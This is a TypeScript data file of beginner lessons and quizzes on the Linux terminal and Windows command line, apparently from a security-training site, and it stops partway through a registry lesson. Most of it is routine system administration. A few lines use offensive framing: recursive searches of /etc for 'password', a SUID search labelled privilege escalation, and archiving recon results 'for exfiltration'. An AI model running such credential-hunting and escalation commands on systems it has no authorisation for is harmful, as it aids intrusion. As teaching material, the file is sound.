import type { Lesson, QuizQuestion } from './types';

const l = (id: string, title: string, instruction: string, extras?: Partial<Lesson>): Lesson => ({
  id, title, instruction, image: null, ...extras,
});

export const ALL_LESSONS: Record<string, Lesson[]> = {
  'linux-terminal-101': [
    l('lt-1', 'What is the Terminal?',
      `The terminal is a text-based interface where you control your computer by typing commands instead of clicking buttons. Think of it as the "real" way to talk to your machine — the GUI is just a friendly wrapper on top.

When you open a terminal, you'll see something like this:

\`\`\`bash
user@qyvora:~$
\`\`\`

This is the **shell prompt**. It tells you:
- **user** — your username
- **qyvora** — the computer's hostname  
- **~** — your current directory (home folder)
- **$** — indicates a regular user (root uses #)

Type your first command:

\`\`\`bash
echo "Hello, Hacker!"
\`\`\`

The \`echo\` command prints text back to you. This is your first step into the terminal.`,
      { hasTerminal: true, terminalCommands: ['echo "Hello, Hacker!"', 'whoami', 'pwd', 'ls'], terminalTitle: 'lesson-terminal' }),

    l('lt-2', 'Navigating the Filesystem',
      `Every file and folder on Linux lives under the root directory \`/\`. Think of it like an upside-down tree starting at \`/\`.

**pwd** — Print Working Directory. Shows where you are:

\`\`\`bash
pwd
# /home/user
\`\`\`

**ls** — List files in the current directory:

\`\`\`bash
ls
# Desktop  Documents  Downloads  Pictures
ls -la    # detailed view with hidden files
\`\`\`

The \`-la\` flag combines \`-l\` (long format) and \`-a\` (show hidden files). Hidden files start with a dot (\`.bashrc\`).

**cd** — Change Directory:

\`\`\`bash
cd Documents    # go into Documents folder
cd ..           # go up one level
cd ~            # go to home directory
cd /etc         # absolute path — go directly to /etc
\`\`\`

**Absolute paths** start with \`/\` (e.g., \`/home/user/Documents\`). **Relative paths** start from where you are (e.g., \`Documents\`).`),

    l('lt-3', 'Working with Files',
      `Creating, reading, and deleting files are the most common terminal tasks.

\`\`\`bash
# Create an empty file
touch notes.txt

# Create a directory
mkdir projects

# Create nested directories (parent dirs too)
mkdir -p projects/hacks/recon

# Copy a file
cp notes.txt projects/notes.txt

# Move (or rename) a file
mv notes.txt projects/old-notes.txt

# Delete a file (permanent — no trash!)
rm old-notes.txt

# Delete a directory and everything inside
rm -rf projects/

# View file contents
cat notes.txt

# Edit a file (nano is beginner-friendly)
nano notes.txt
\`\`\`

The \`rm -rf\` command is dangerous. \`-r\` means recursive (deletes folders), \`-f\` means force (no confirmation). Double-check before running it.`),

    l('lt-4', 'File Permissions',
      `Linux uses a permission system to control who can read, write, or execute files.

View permissions with \`ls -l\`:

\`\`\`bash
ls -l script.sh
# -rwxr--r--  1 user user  42 Jul  4 12:00 script.sh
\`\`\`

The first part \`-rwxr--r--\` breaks down as:
- **First char**: file type (\`-\` = file, \`d\` = directory)
- **Next 3**: owner permissions (\`rwx\` = read, write, execute)
- **Next 3**: group permissions (\`r--\` = read only)
- **Next 3**: everyone else (\`r--\` = read only)

Change permissions with \`chmod\`:

\`\`\`bash
# Add execute permission for the owner
chmod +x script.sh

# Set exact permissions: owner=rwx, group=rx, others=r
chmod 755 script.sh

# The numbers: r=4, w=2, x=1 → 7=rwx, 5=rx, 5=rx
\`\`\`

Change owner with \`chown\`:

\`\`\`bash
sudo chown root:root script.sh
# Changes owner to root, group to root
\`\`\``),

    l('lt-5', 'Pipes and Redirection',
      `Pipes and redirection let you chain commands together — this is where the terminal becomes powerful.

**Redirect output to a file** with \`>\`:

\`\`\`bash
echo "target.com" > targets.txt
# Writes "target.com" into targets.txt (overwrites!)

echo "example.com" >> targets.txt
# Appends "example.com" (doesn't overwrite)
\`\`\`

**Pipe** (\`|\`) sends output of one command as input to another:

\`\`\`bash
ls -la | grep "\.txt"
# Lists only .txt files

cat targets.txt | sort | uniq
# Sorts and removes duplicates

ps aux | grep "nginx"
# Find running nginx processes
\`\`\`

**grep** searches for patterns:

\`\`\`bash
grep "error" /var/log/syslog
# Find all lines containing "error"

grep -i "warning" log.txt
# Case-insensitive search

grep -r "password" /etc/
# Recursively search a directory
\`\`\``),

    l('lt-6', 'Process Management',
      `Every running program is a **process**. You can view, prioritize, and kill them.

**ps** — snapshot of current processes:

\`\`\`bash
ps aux
# Shows all processes with user, CPU, memory

ps aux | grep ssh
# Find SSH-related processes
\`\`\`

**top** — live updating view of processes:

\`\`\`bash
top
# Press 'q' to quit
\`\`\`

**kill** — terminate a process by its PID:

\`\`\`bash
kill 1234          # gracefully stop PID 1234
kill -9 1234       # force kill (SIGKILL)
kill -15 1234      # terminate (SIGTERM)
\`\`\`

**Background and foreground jobs:**

\`\`\`bash
sleep 100 &        # run in background (gives you a job ID)
jobs               # list background jobs
fg %1              # bring job 1 to foreground
Ctrl+Z             # suspend current process
bg %1              # resume job 1 in background
\`\`\`

Understanding process management is crucial for controlling long-running tools like scanners and listeners.`,
      { hasQuiz: true, quiz: [
        { id: 'lt-6-q1', question: 'Which command shows a live-updating view of all running processes?', options: ['ps aux', 'top', 'jobs', 'kill'], correctIndex: 1, explanation: 'top shows a live, updating view of processes. ps aux provides a snapshot, not live updates.' },
        { id: 'lt-6-q2', question: 'What does `kill -9 1234` do?', options: ['Pauses process 1234', 'Gracefully stops process 1234', 'Force kills process 1234 (SIGKILL)', 'Moves process 1234 to background'], correctIndex: 2, explanation: 'kill -9 sends SIGKILL, which forcefully terminates the process immediately without cleanup.' },
        { id: 'lt-6-q3', question: 'How do you run a command in the background?', options: ['Use Ctrl+Z', 'Append `&` to the command', 'Use the `bg` command', 'Use `run --background`'], correctIndex: 1, explanation: 'Appending `&` to a command runs it in the background, giving you your prompt back immediately.' },
      ] }),

    l('lt-7', 'Archiving & Compression',
      `When working with multiple files — common in security toolkits and log archives — you need to bundle and compress them. Start with a single file, then build up to full directory archives.

**Compress a single file with gzip:**

\`\`\`bash
# Start small: compress one file
gzip notes.txt
# Result: notes.txt.gz (original file is removed)
# Decompress it back
gunzip notes.txt.gz
# Or use gzip -d
gzip -d notes.txt.gz
\`\`\`

**Work with gzip without decompressing:**

\`\`\`bash
# View compressed file content without extracting
zcat notes.txt.gz
# Search inside a compressed file
zgrep "password" notes.txt.gz
# Same as: gunzip -c notes.txt.gz | grep "password"
\`\`\`

**Tar: bundle files together (no compression yet):**

\`\`\`bash
# Create a tar archive (like a zip file without compression)
tar -cf archive.tar file1.txt file2.txt folder1/
# -c = create, -f = filename

# List contents of a tar
tar -tf archive.tar

# Extract a tar
tar -xf archive.tar
\`\`\`

**Combine tar with compression (the standard approach):**

\`\`\`bash
# Create a compressed archive (.tar.gz or .tgz)
tar -czf project.tar.gz folder1/ file1.txt
# -z = gzip compression

# Extract it
tar -xzf project.tar.gz

# Use bzip2 (better compression, slower)
tar -cjf project.tar.bz2 folder1/
# -j = bzip2

# Use xz (best compression, slowest)
tar -cJf project.tar.xz folder1/
# -J = xz
\`\`\`

**Working with zip files (cross-platform):**

\`\`\`bash
# Create a zip file
zip -r archive.zip folder1/

# Extract a zip file
unzip archive.zip

# List contents without extracting
unzip -l archive.zip

# Password-protect a zip (NOT secure, but common)
zip -e secure.zip secrets.txt
\`\`\`

**Real-world security scenarios:**

\`\`\`bash
# Back up log files before analysis
tar -czf logs-$(date +%F).tar.gz /var/log/

# Extract a tool you downloaded
tar -xzf nmap-script.tar.gz -C /opt/tools/

# Compress recon results for exfiltration
tar -czf recon-results.tar.gz ./recon/
gpg -c recon-results.tar.gz  # Encrypt with password
\`\`\`

The key progression: single file → archive → compressed archive → encrypted archive. Each step adds a layer of capability.`,
      { hasTerminal: true, terminalCommands: ['gzip --help', 'tar --help', 'tar -czf test.tar.gz .', 'tar -tzf test.tar.gz'], terminalTitle: 'lesson-terminal' }),

    l('lt-8', 'Text Editors & File Viewing',
      `Viewing and editing files is a daily task. Start with simple viewing, then move to editing.

**Viewing files (no editing, just looking):**

\`\`\`bash
# less — scroll through a file (press q to quit)
less /var/log/syslog

# head — see the first lines (default: 10)
head /etc/passwd
head -n 20 /etc/passwd    # First 20 lines

# tail — see the last lines
tail /var/log/auth.log
tail -f /var/log/auth.log  # Follow in real-time (Ctrl+C to stop)
tail -n 50 /var/log/syslog # Last 50 lines

# wc — word/line count
wc -l /etc/passwd   # Count lines
wc -w report.txt    # Count words
wc -c file.bin      # Count bytes
\`\`\`

**Nano — the beginner-friendly editor:**

\`\`\`bash
# Open a file (creates it if it doesn't exist)
nano notes.txt
\`\`\`

Inside nano:
- Type to edit
- \`Ctrl+O\` — save (WriteOut)
- \`Ctrl+X\` — exit
- \`Ctrl+W\` — search
- \`Ctrl+K\` — cut line, \`Ctrl+U\` — paste
- \`Alt+6\` — copy line

**Vim — the power editor (steeper learning curve, much faster):**

\`\`\`bash
# Open a file
vim notes.txt
\`\`\`

Vim modes (this is the key concept):
- \`Normal mode\` — default on open. Press \`Esc\` to return here.
- \`Insert mode\` — press \`i\` to start typing. Press \`Esc\` to leave.
- \`Command mode\` — press \`:\` to enter commands.

**Essential vim commands (normal mode):**
\`\`\`
i        — enter insert mode (start typing)
dd       — delete current line
yy       — copy (yank) current line
p        — paste below cursor
:w       — save file
:q       — quit
:wq      — save and quit
:q!      — quit without saving
/text    — search for "text"
n        — next search result
u        — undo
Ctrl+r   — redo
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. View a file
cat /etc/hostname

# 2. Scroll through a file
less /etc/hosts

# 3. Quick edit with nano
nano /tmp/targets.txt
# Type: scanme.nmap.org, then Ctrl+O, Enter, Ctrl+X

# 4. Power edit with vim (insert, edit, save, quit)
vim /tmp/notes.txt
# Press i → type → Esc → :wq → Enter
\`\`\`

Start with nano. Once you're comfortable, force yourself to use vim for a week. It will feel awkward at first, then incredibly powerful.`),

    l('lt-9', 'SSH & Remote Connections',
      `SSH (Secure Shell) lets you control remote computers securely. Start locally, then connect remotely.

**Check if SSH is installed:**
\`\`\`bash
ssh -V
# Output: OpenSSH_9.2p1 Debian-2, OpenSSL 3.0.9
\`\`\`

**Connect to a remote machine (build up the command):**
\`\`\`bash
# Simplest form — connect with default port (22)
ssh user@192.168.1.100

# Specify a different port
ssh -p 2222 user@192.168.1.100

# Run a single command remotely (then disconnect)
ssh user@192.168.1.100 "ls -la /var/www/"

# Run a command with full terminal allocation
ssh -t user@192.168.1.100 "sudo systemctl status apache2"
\`\`\`

**SSH keys — passwordless login:**
\`\`\`bash
# Generate a key pair (use empty passphrase for automation)
ssh-keygen -t ed25519 -f ~/.ssh/hacker_key

# Copy the public key to the remote server
ssh-copy-id -i ~/.ssh/hacker_key user@192.168.1.100

# Now connect without a password
ssh -i ~/.ssh/hacker_key user@192.168.1.100
\`\`\`

**SSH config file — shortcuts for frequent connections:**
\`\`\`bash
# Edit ~/.ssh/config
Host target
    HostName 192.168.1.100
    User root
    Port 22
    IdentityFile ~/.ssh/hacker_key

# Now just type:
ssh target
\`\`\`

**SSH port forwarding (tunneling):**
\`\`\`bash
# Local port forward: access remote service via local port
ssh -L 8080:localhost:80 user@target
# Now open http://localhost:8080 in your browser

# Dynamic port forward (SOCKS proxy)
ssh -D 1080 user@target
# Configure browser to use SOCKS proxy 127.0.0.1:1080
\`\`\`

**Copy files over SSH:**
\`\`\`bash
# Copy a file TO a remote server
scp localfile.txt user@192.168.1.100:/tmp/

# Copy a file FROM a remote server
scp user@192.168.1.100:/var/log/syslog ./remote-syslog

# Copy an entire directory
scp -r ./recon/ user@192.168.1.100:/home/user/recon/
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. Generate a key
ssh-keygen -t ed25519

# 2. Copy to remote
ssh-copy-id user@target

# 3. Connect and explore
ssh user@target "uname -a; df -h; who"

# 4. Set up config for quick access
echo "Host mytarget\n    HostName 192.168.1.100\n    User root" >> ~/.ssh/config
chmod 600 ~/.ssh/config
\`\`\`

**Important:** \`~/.ssh\` directory must have permissions \`700\`, and files inside must be \`600\`. SSH will refuse to work if permissions are too open.`),

    l('lt-10', 'Finding Things: Files & Commands',
      `Knowing how to find files, commands, and information is crucial. Start with simple lookups, then build to complex searches.

**Find where a command is located:**
\`\`\`bash
# which — show the path of a command
which nmap
# /usr/bin/nmap

which python3
# /usr/bin/python3

# whereis — find binary, source, and man page
whereis nmap
# nmap: /usr/bin/nmap /usr/share/nmap /usr/share/man/man1/nmap.1.gz
\`\`\`

**Find files by name (simple searches):**
\`\`\`bash
# locate — fast, uses a database
locate .bashrc
locate password.txt

# Update the database first
sudo updatedb

# locate is fast but might not have recent files
\`\`\`

**Find files by properties (powerful searches):**
\`\`\`bash
# find — searches the filesystem directly, slower but current

# By name (exact)
find /home -name "notes.txt"

# By name (case-insensitive)
find /home -iname "*.txt"

# By type
find / -type d -name "logs"     # directories
find / -type f -name "*.conf"   # files only
find / -type l                  # symbolic links

# By size
find / -size +100M              # larger than 100MB
find / -size -1k                # smaller than 1KB
find / -size +1G                # larger than 1GB
\`\`\`

**Find by time — crucial for forensics:**
\`\`\`bash
# Files modified in the last 10 minutes
find /var/log -mmin -10

# Files modified in the last 24 hours
find /home -mtime -1

# Files modified more than 30 days ago
find /tmp -mtime +30

# Find and delete old files
find /tmp -mtime +7 -delete
\`\`\`

**Find and execute commands on results:**
\`\`\`bash
# Find all .txt files and count lines in each
find /home -iname "*.txt" -exec wc -l {} \\;

# Find files with SUID bit set (privilege escalation!)
find / -perm -4000 -type f 2>/dev/null

# Find world-writable files
find / -perm -o+w -type f 2>/dev/null
\`\`\`

**Combine with grep for powerful searches:**
\`\`\`bash
# Find files containing a specific string
grep -r "password" /etc/

# Find only .conf files with "Listen" in them
grep -r "Listen" --include="*.conf" /etc/

# Find files with "secret" in the name, then search contents
find /home -iname "*secret*" -exec grep -l "password" {} \\;
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. Find your shell
which bash

# 2. Find all config files
find /etc -name "*.conf" | head -20

# 3. Find large files eating disk space
find / -size +500M -type f 2>/dev/null | sort -rn | head -10

# 4. Find recent changes in /etc
find /etc -mmin -60 -type f
\`\`\``),

    l('lt-11', 'Environment Variables & Shell Configuration',
      `Your shell environment is configured by variables. Understanding them lets you customize your terminal and automate tasks.

**View all environment variables:**
\`\`\`bash
# Print all environment variables
env

# Or with more control
printenv

# Filter a specific variable
printenv PATH
echo $PATH    # Same thing, shorter
\`\`\`

**Common environment variables:**
\`\`\`bash
echo $HOME     # Your home directory: /home/user
echo $USER     # Your username
echo $SHELL    # Your shell: /bin/bash
echo $PWD      # Current directory
echo $PATH     # Where the system looks for executables
echo $LANG     # Language/locale settings
echo $TERM     # Terminal type
\`\`\`

**Set and use variables:**
\`\`\`bash
# Set a variable (local to current shell)
TARGET="192.168.1.1"
echo $TARGET
ping -c 1 $TARGET

# Export a variable (available to child processes)
export TARGET="192.168.1.1"
./my-script.sh   # This script can use $TARGET

# Combine variables
HOST="scanme"
DOMAIN=".nmap.org"
TARGET="$HOST$DOMAIN"
echo $TARGET    # scanme.nmap.org
\`\`\`

**The PATH variable — where commands live:**
\`\`\`bash
# See your current PATH (colon-separated list)
echo $PATH
# /usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin

# Add a directory to PATH (for your custom scripts)
export PATH=$PATH:$HOME/scripts

# Make this permanent by adding it to ~/.bashrc
echo 'export PATH=$PATH:$HOME/scripts' >> ~/.bashrc
\`\`\`

**Shell configuration files:**
\`\`\`bash
# ~/.bashrc — runs every time you open a new terminal
# ~/.bash_profile — runs for login shells
# ~/.bash_history — stores your command history

# See how many commands are stored
echo $HISTSIZE
echo $HISTFILESIZE

# See your history file location
echo $HISTFILE
# Usually: /home/user/.bash_history
\`\`\`

**Customize your prompt:**
\`\`\`bash
# Simple prompt customization
export PS1="\\u@\\h:\\w\\$ "
# \\u = user, \\h = hostname, \\w = full path

# Color prompt (for root)
export PS1="\\[\\e[31m\\]\\u@\\h\\[\\e[0m\\]:\\w\\$ "

# Make it permanent
echo 'export PS1="\\u@\\h:\\w\\$ "' >> ~/.bashrc
\`\`\`

**Aliases — shortcuts for long commands:**
\`\`\`bash
# Create temporary aliases
alias ll='ls -la --color=auto'
alias scan='nmap -sV -sC'
alias myip='curl -s ifconfig.me'

# See all aliases
alias

# Remove an alias
unalias ll

# Make aliases permanent
echo "alias ll='ls -la --color=auto'" >> ~/.bashrc
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. See your current PATH
echo $PATH | tr ':' '\\n'

# 2. Create a variable and use it
export TARGET="scanme.nmap.org"
echo "Scanning $TARGET"

# 3. Create a useful alias
alias ll='ls -la'
alias

# 4. Add to bashrc (try it)
echo 'alias ll="ls -la --color=auto"' >> ~/.bashrc && source ~/.bashrc
\`\`\``),

    l('lt-12', 'Disk Usage & System Management',
      `Understanding disk usage helps you find space hogs and manage system resources. Start simple, then drill down.

**Check disk space on mounted filesystems:**
\`\`\`bash
# df — disk free (human-readable)
df -h

# Output:
# Filesystem      Size  Used Avail Use% Mounted on
# /dev/sda1       234G   56G  167G  26% /

# Show filesystem type
df -T

# Include pseudo filesystems
df -a
\`\`\`

**Check directory/file sizes:**
\`\`\`bash
# du — disk usage
du -sh /var/log      # Total size of a directory (-s = summary, -h = human)
# 1.2G    /var/log

du -sh *             # Size of every item in current directory
du -sh .[!.]* *      # Including hidden files

# Show largest subdirectories (sort by size)
du -sh /var/* | sort -rh | head -10

# Show size of each file in a directory
du -ah /var/log | sort -rh | head -10
\`\`\`

**Find what's eating disk space:**
\`\`\`bash
# The classic disk space investigation
df -h                         # Check overall usage
du -sh /* | sort -rh          # Largest top-level directories
du -sh /var/* | sort -rh      # Drill into /var
du -sh /var/log/* | sort -rh  # Drill into /var/log

# Find files larger than 1GB
find / -type f -size +1G -exec ls -lh {} \\; 2>/dev/null | sort -k5 -rh
\`\`\`

**Mount and unmount filesystems:**
\`\`\`bash
# List mounted filesystems
mount
df -h

# Mount a USB drive
sudo mount /dev/sdb1 /mnt/usb

# Unmount safely
sudo umount /mnt/usb

# Mount a disk image (like an ISO)
sudo mount -o loop disk-image.iso /mnt/iso
\`\`\`

**System information commands:**
\`\`\`bash
# uname — system info
uname -a           # All system info
uname -r           # Kernel release
uname -m           # Architecture (x86_64, aarch64)

# lsb_release — distribution info
lsb_release -a

# hostnamectl — full system info (systemd systems)
hostnamectl

# lscpu — CPU details
lscpu | grep "Model name"

# free — memory usage
free -h            # Human-readable
free -ht           # With totals
free -s 5          # Refresh every 5 seconds
\`\`\`

**Check system uptime and load:**
\`\`\`bash
# uptime — how long since last boot
uptime
# 14:32:11 up 3 days,  2:15,  2 users,  load average: 0.08, 0.03, 0.01

# The three numbers are load averages (1, 5, 15 minutes)
# Below 1.0 = healthy, above = busy

# dmesg — kernel messages
dmesg | tail -20   # Last 20 kernel messages
dmesg | grep -i error
\`\`\`

**Practical progression:**
\`\`\`bash
# 1. Check overall disk usage
df -h

# 2. Find the top 5 largest directories in /var
du -sh /var/* | sort -rh | head -5

# 3. Check memory
free -h

# 4. Check system info
uname -a
hostnamectl
\`\`\`

This lesson wraps up the Linux Terminal 101 course. You now have the essential skills to navigate, manipulate, and manage a Linux system from the command line — the foundation of all offensive security work.`),
  ],

  'windows-cmd-101': [
    l('wc-1', 'Command Prompt vs PowerShell',
      `Windows has two command-line interfaces: **Command Prompt (CMD)** and **PowerShell**. CMD is the traditional tool, while PowerShell is more modern and powerful.

Open CMD by pressing \`Win + R\`, typing \`cmd\`, and pressing Enter. You'll see:

\`\`\`cmd
C:\\Users\\YourName>
\`\`\`

This is the prompt. Your current directory is \`C:\\Users\\YourName\`. The \`>\` waits for your command.

Try your first command:

\`\`\`cmd
echo Hello, Hacker!
\`\`\`

**PowerShell** has a blue background and uses different commands (\`Get-ChildItem\` instead of \`dir\`). For this course, we'll focus on CMD since it's universal on Windows.`),

    l('wc-2', 'Navigation & File Management',
      `Navigating Windows from the command line is similar to Linux but uses different commands.

\`\`\`cmd
dir                    List files and folders
cd Documents           Change to Documents folder
cd ..                  Go up one folder
cd \\                   Go to root (C:\\)
mkdir projects         Create a folder
copy file.txt backup.txt    Copy a file
move file.txt C:\\backup\\    Move a file
del file.txt           Delete a file
rmdir folder           Remove a folder (must be empty)
rmdir /s folder        Remove folder and contents
type file.txt          Display file contents
\`\`\`

Unlike Linux, Windows uses backslashes (\`\\\`) for paths and drive letters (\`C:\`, \`D:\`).

\`\`\`cmd
C:> D:          Switch to D: drive
C:> cd /D E:\\projects    Switch to a different drive and folder
\`\`\``),

    l('wc-3', 'System Information',
      `Windows provides powerful commands to inspect system configuration.

\`\`\`cmd
systeminfo          Detailed system information (OS, RAM, BIOS)
\`\`\`

This shows your Windows version, install date, memory, network adapters, and more.

\`\`\`cmd
tasklist            List all running processes
tasklist /SVC       Show services behind each process
\`\`\`

Stop a process:

\`\`\`cmd
taskkill /PID 1234        Stop by process ID
taskkill /IM notepad.exe  Stop by image name
\`\`\`

\`\`\`cmd
whoami              Your current username
net user            List all user accounts on the system
hostname            The computer's network name
\`\`\`

These commands help you understand the Windows system you're working on — essential for both defense and offense.`),

    l('wc-4', 'Network Commands',
      `Windows has built-in network commands for troubleshooting and reconnaissance.

\`\`\`cmd
ipconfig            Show IP configuration
ipconfig /all       Detailed info (MAC address, DNS, DHCP)
\`\`\`

\`\`\`cmd
ping 8.8.8.8        Test connectivity to a host
ping -n 10 google.com    Send 10 pings
\`\`\`

\`\`\`cmd
tracert google.com  Trace the route packets take
\`\`\`

Each hop shows a router along the path between you and the destination.

\`\`\`cmd
nslookup google.com     DNS lookup — find IP address of a domain
\`\`\`

\`\`\`cmd
netstat -an             Show all active network connections and listening ports
netstat -an | findstr "LISTEN"    Show only listening ports
netstat -an | findstr ":80"       Show connections on port 80
\`\`\`

The \`| findstr\` command is CMD's equivalent of \`grep\`. It filters text.`),

    l('wc-5', 'Scripting Basics',
      `Batch files (.bat) let you chain multiple CMD commands into a reusable script.

Create a file called \`scan.bat\`:

\`\`\`batch
@echo off
echo === Network Scan ===
ipconfig
echo.
echo === Active Connections ===
netstat -an
echo.
echo === DNS Cache ===
ipconfig /displaydns
pause
\`\`\`

Run it by double-clicking or typing \`scan.bat\` in CMD.

**PowerShell one-liners** are more powerful:

\`\`\`powershell
Get-Process | Where-Object CPU -gt 10
# List processes using more than 10% CPU

Test-Connection -Count 2 google.com
# PowerShell's version of ping

Get-Service | Where-Object Status -eq "Running"
# List all running services
\`\`\`

Scripting turns manual tasks into automated workflows — a core skill for any Windows operator.`, { hasQuiz: true, quiz: [
        { id: 'wc-5-q1', question: 'How do you create a reusable batch script on Windows?', options: ['Save commands in a .bat file', 'Save commands in a .exe file', 'Save commands in a .ps1 file', 'Save commands in a .cmd file'], correctIndex: 0, explanation: 'Batch files use the .bat extension and contain CMD commands that execute sequentially.' },
        { id: 'wc-5-q2', question: 'What is the PowerShell equivalent of `dir`?', options: ['ls', 'Get-ChildItem', 'List-Files', 'Show-Directory'], correctIndex: 1, explanation: 'PowerShell uses Get-ChildItem (or its aliases: ls, dir) to list directory contents.' },
        { id: 'wc-5-q3', question: 'How do you filter output in CMD?', options: ['grep', 'findstr', 'select-string', 'filter'], correctIndex: 1, explanation: 'CMD uses `findstr` to filter text output, similar to `grep` on Linux.' },
      ] }),

    l('wc-6', 'PowerShell Deep Dive',
      `PowerShell is far more powerful than CMD. It works with objects, not just text. Start simple, then build up.

**The basics — CMD compatibility:**
\`\`\`powershell
# These work in both CMD and PowerShell
dir
cd
echo "Hello"
\`\`\`

**PowerShell-native commands (cmdlets):**
\`\`\`powershell
# Verb-Noun naming convention
Get-Process          # List running processes (like tasklist)
Get-Service          # List services
Get-ChildItem        # List files (like dir)
Set-Location         # Change directory (like cd)

# Common aliases
Get-ChildItem        # Also: dir, ls
Set-Location         # Also: cd, sl
Get-Content          # Also: cat, type
\`\`\`

**Working with objects — PowerShell's superpower:**
\`\`\`powershell
# Get processes, filter, and format
Get-Process | Where-Object CPU -gt 10 | Sort-Object CPU -Descending

# Select specific properties
Get-Process | Select-Object Name, CPU, WorkingSet

# Export to CSV
Get-Process | Export-Csv processes.csv

# Convert to HTML for a report
Get-Service | ConvertTo-Html -Property Name, Status > services.html
\`\`\`

**Filtering and selecting — build up from simple to complex:**
\`\`\`powershell
# Simple: get all running services
Get-Service | Where-Object Status -eq "Running"

# Medium: get services that start automatically but are stopped
Get-Service | Where-Object { $_.StartType -eq "Automatic" -and $_.Status -eq "Stopped" }

# Advanced: find processes using more than 100MB of memory
Get-Process | Where-Object WorkingSet -gt 100MB | Sort-Object WorkingSet -Descending
\`\`\`

**Remote management with PowerShell:**
\`\`\`powershell
# Test if a remote machine is reachable
Test-Connection -ComputerName 192.168.1.100 -Count 2

# Get processes from a remote machine (requires WinRM)
Get-Process -ComputerName 192.168.1.100

# Enter a remote PowerShell session
Enter-PSSession -ComputerName 192.168.1.100
# Your prompt changes to: [192.168.1.100]:
# Type Exit-PSSession to leave
\`\`\`

**File manipulation with PowerShell:**
\`\`\`powershell
# Read a file
Get-Content C:\\Users\\admin\\notes.txt

# Read last 10 lines (like tail)
Get-Content C:\\Users\\admin\\log.txt -Tail 10

# Follow a log file in real-time
Get-Content C:\\Windows\\Logs\\dism.log -Wait

# Search within files
Select-String -Path C:\\logs\\*.log -Pattern "error" -CaseSensitive:$false

# Create a file with content
Set-Content -Path C:\\temp\\targets.txt -Value "192.168.1.1"
Add-Content -Path C:\\temp\\targets.txt -Value "192.168.1.2"
\`\`\`

**Practical progression:**
\`\`\`powershell
# 1. List all running services
Get-Service | Where-Object Status -eq "Running"

# 2. Find the top 5 memory-hungry processes
Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 5

# 3. Export your findings
Get-Process | Where-Object WorkingSet -gt 50MB | Export-Csv big-processes.csv

# 4. Read the CSV back
Import-Csv big-processes.csv
\`\`\``),

    l('wc-7', 'Windows Service & Process Management',
      `Managing services and processes is critical for understanding what's running on a Windows system.

**View and manage processes with Tasklist:**
\`\`\`cmd
# List all processes
tasklist

# List processes with DLL information
tasklist /M

# List services hosted in each process
tasklist /SVC

# Filter by process name
tasklist /FI "IMAGENAME eq notepad.exe"

# Filter by memory usage (find memory hogs)
tasklist /FI "MEMUSAGE gt 50000"   # Memory in KB

# Filter by session
tasklist /FI "SESSION eq 1"
\`\`\`

**Kill processes:**
\`\`\`cmd
# Kill by process ID
taskkill /PID 1234

# Kill by image name (all instances)
taskkill /IM notepad.exe

# Force kill (use when a process won't stop)
taskkill /F /IM stuck.exe

# Kill a process tree (parent + children)
taskkill /T /IM chrome.exe
\`\`\`

**View and manage services:**
\`\`\`cmd
# List all services
sc query

# List only running services
sc query state= running

# Get detailed info about a specific service
sc query wuauserv   # Windows Update service

# Start, stop, restart services
net start wuauserv
net stop wuauserv

# Or use sc (more control)
sc start wuauserv
sc stop wuauserv
sc config wuauserv start= auto      # Set to auto-start
sc config wuauserv start= disabled  # Disable a service
\`\`\`

**PowerShell service management (more powerful):**
\`\`\`powershell
# List all services with status
Get-Service

# Find stopped services that should be running
Get-Service | Where-Object { $_.StartType -eq "Automatic" -and $_.Status -eq "Stopped" }

# Start/Stop services
Start-Service -Name wuauserv
Stop-Service -Name wuauserv
Restart-Service -Name wuauserv

# Set startup type
Set-Service -Name wuauserv -StartupType Automatic
Set-Service -Name wuauserv -StartupType Disabled
\`\`\`

**Scheduled tasks — what runs automatically:**
\`\`\`cmd
# List scheduled tasks
schtasks

# Get detailed info about a task
schtasks /QUERY /FO LIST /V

# Create a scheduled task
schtasks /CREATE /SC DAILY /TN "MyTask" /TR "C:\\script.bat" /ST 09:00

# Run a task manually
schtasks /RUN /TN "MyTask"

# Delete a task
schtasks /DELETE /TN "MyTask" /F
\`\`\`

**Practical progression:**
\`\`\`cmd
# 1. List all running processes, sorted by memory usage
tasklist /FI "MEMUSAGE gt 10000" /V

# 2. Check if Windows Update service is running
sc query wuauserv | findstr STATE

# 3. View scheduled tasks
schtasks /QUERY /FO TABLE | findstr "Daily"
\`\`\``),

    l('wc-8', 'Registry & System Configuration',
      `The Windows Registry is a database of system and application settings. Understanding it is essential for both configuration and forensics.

**Registry structure basics:**
\`\`\`
HKEY_LOCAL_MACHINE (HKLM) — System-wide settings
HKEY_CURRENT_USER (HKCU) — Current user settings
HKEY_USERS (HKU)         — All user profiles
HKEY_CLASSES_ROOT (HKCR) — File associations
HKEY_CURRENT_CONFIG (HKCC) — Hardware profile
\`\`\`

**View registry from command line with REG:**
\`\`\`cmd
# Query a registry key
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion

# Query a specific value
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductName

# Query with recursive (all subkeys)
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /s

# Export a registry key to a file
reg export "HKCU\\Software\\Microsoft" my-settings.reg

# Import registry settings
reg import my-settings.reg
\`\`\`

**Common forensic registry locations:**
\`\`\`cmd
# Startup programs (autoruns)
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run

# Recently opened files
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"

# Network history
reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MapNetworkDrive" /s

# USB device history
reg query HKLM\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /s

# Installed programs
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall" /s
\`\`\`

**System Configuration with MSConfig:**
\`\`\`cmd
# Open System Configuration
msconfig
# (GUI tool — boot options, services, startup)
\`\`\`

**Environment variables on Windows:**
\`\`\`cmd
# View all environment variables
set

# View a specific variable
set PATH
echo %PATH%

# Common variables
%TEMP%      # Temporary files
%APPDATA%   # Application data (roaming)
%USERPROFILE%  # User's home directory
%WINDIR%    # Windows directory
%PROGRAMFILES%  # Program Files

# Set a temporary variable
